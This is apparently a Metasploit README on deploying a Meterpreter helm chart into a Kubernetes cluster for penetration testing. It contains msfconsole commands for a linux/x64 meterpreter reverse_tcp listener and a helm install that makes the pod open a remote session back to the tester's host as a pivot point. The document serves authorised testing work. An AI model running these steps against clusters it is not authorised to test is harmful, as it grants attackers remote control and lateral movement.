# Metasploit in Kubernetes

The most common workflow to test a Kubernetes environment with Metasploit is to target the Kubernetes API externally,
or through a compromised container - both of these workflows are currently supported directly within msfconsole.

An alternative to compromising a Kubernetes container to gain a Meterpreter session is to install the `meterpreter` helm chart into
a Kubernetes environment directly. This newly opened Meterpreter session will act as the pivot point for running additional
Metasploit modules, similar to the behavior of compromising an existing Kubernetes container with msfconsole.

## Installation

To install the Metasploit resources in to your Kubernetes environment: 

1. Make sure [Helm](https://helm.sh/) (version 3 or above) is [installed](https://helm.sh/docs/intro/install/)
2. Make sure you have an available Kubernetes cluster to deploy Metasploit. You can install a local Kubernetes cluster using [kind](https://kind.sigs.k8s.io/docs/user/quick-start/#installation)
   You can create local kind cluster by running  `make create-kind-cluster`
2. A penester should create a Metasploit listener from msfconsole:
```
use payload/linux/x64/meterpreter/reverse_tcp
set LHOST x.x.x.x
set LPORT 4444
to_handler
```

3. Install meterpreter helm chart by running:

```sh
export LHOST="x.x.x.x"
export LPORT="4444"
helm upgrade --create-namespace -i -n metasploit meterpreter ./meterpreter --set lhost=$LHOST --set lport=$LPORT
```
4. If the listener from step 3 was created, ensure you now have a Meterpreter session in msfconsole

## Privileges

The Meterpreter container can be deployed with different privileges and permissions - see the `privileges` section within
[./meterpreter/values.yaml](values.yaml) for more details.
